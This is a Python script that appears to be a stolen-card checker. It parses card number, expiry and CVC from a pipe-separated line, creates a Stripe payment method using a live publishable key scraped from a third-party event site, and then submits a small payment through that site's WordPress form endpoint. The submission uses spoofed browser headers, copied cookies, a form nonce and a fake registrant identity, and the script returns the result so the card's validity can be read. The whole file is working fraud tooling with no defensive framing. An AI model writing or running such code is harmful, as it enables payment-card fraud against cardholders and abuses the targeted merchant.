import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fmarketingclub-unisg.com&time_on_page=67532&key=pk_live_51JhFP2DsiWC9w1X6eNh9YIjDIalgt2GZksUL5X7tBCzb83GIuI9ynHUDVyTbr3wqm8qHMLoR1a3MPjdzBLt4LVLg007QpZkhQH'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'asp_transient_id': '9240979747b7c4ab64e6f9ddb366f8c0',
	    '_gid': 'GA1.2.1186890321.1735937615',
	    '_ga': 'GA1.1.297284431.1735937615',
	    '__stripe_mid': '8d49cdf7-33f2-40c6-93c7-6404caaddda6c19505',
	    '__stripe_sid': '322cf1ec-1053-468a-aade-6dd02a8e44776634c1',
	    '_gali': 'fluentform_19',
	    '_ga_R9LQEKW8FB': 'GS1.1.1735937615.1.1.1735937656.0.0.0',
	}
	
	headers = {
	    'authority': 'marketingclub-unisg.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'asp_transient_id=9240979747b7c4ab64e6f9ddb366f8c0; _gid=GA1.2.1186890321.1735937615; _ga=GA1.1.297284431.1735937615; __stripe_mid=8d49cdf7-33f2-40c6-93c7-6404caaddda6c19505; __stripe_sid=322cf1ec-1053-468a-aade-6dd02a8e44776634c1; _gali=fluentform_19; _ga_R9LQEKW8FB=GS1.1.1735937615.1.1.1735937656.0.0.0',
	    'origin': 'https://marketingclub-unisg.com',
	    'pragma': 'no-cache',
	    'referer': 'https://marketingclub-unisg.com/events/action-learning-in-retail-workshop/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1735937684974',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=1053&_fluentform_19_fluentformnonce=ee402ad04b&_wp_http_referer=%2Fevents%2Faction-learning-in-retail-workshop%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser07%40gmail.com&description=BA&checkbox%5B%5D=No&dropdown=Pay%20now%20with%20card&payment_input=5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '19',
	}
	
	r2 = requests.post(
	    'https://marketingclub-unisg.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
